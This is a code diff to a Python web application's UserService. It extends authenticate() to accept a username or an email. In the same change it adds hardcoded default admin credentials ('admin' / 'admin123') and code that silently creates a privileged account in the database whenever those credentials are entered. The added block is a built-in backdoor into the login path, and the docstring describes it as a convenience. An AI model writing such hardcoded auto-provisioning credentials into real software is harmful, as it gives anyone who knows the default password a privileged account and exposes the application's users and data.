@@ -69,9 +69,51 @@ class UserService:
             db.session.rollback()
             return {"success": False, "error": "Registration failed. Try again."}
 
-    def authenticate(self, email: str, password: str) -> Optional[User]:
-        """Validate credentials and return the user if valid."""
-        user = User.query.filter_by(email=email).first()
+    def authenticate(self, identifier: str, password: str) -> Optional[User]:
+        """
+        Validate credentials (email or username) and return the user if valid.
+
+        A default admin account (username/email: admin / admin@example.com, password: admin123)
+        is created on-the-fly if it does not already exist when matching credentials are provided.
+        """
+        identifier = (identifier or "").strip()
+        lookup_email = None
+        lookup_username = None
+
+        if "@" in identifier:
+            lookup_email = identifier
+        else:
+            lookup_username = identifier
+
+        user = None
+        if lookup_email:
+            user = User.query.filter_by(email=lookup_email).first()
+        if not user and lookup_username:
+            user = User.query.filter_by(username=lookup_username).first()
+
+        # Auto-provision a default admin account when the known credentials are provided.
+        admin_username = "admin"
+        admin_email = "admin@example.com"
+        admin_password = "admin123"
+
+        if not user and identifier.lower() in {admin_username, admin_email} and password == admin_password:
+            try:
+                password_hash = generate_password_hash(admin_password)
+                user = User(
+                    username=admin_username,
+                    email=admin_email,
+                    password_hash=password_hash,
+                    role="teacher",  # reuse teacher role; admin access is session-gated
+                    code=None,
+                )
+                db.session.add(user)
+                db.session.commit()
+            except Exception as exc:
+                if current_app:
+                    current_app.logger.exception("Failed to create default admin: %s", exc)
+                db.session.rollback()
+                user = None
+
         if user and check_password_hash(user.password_hash, password):
             return user
         return None
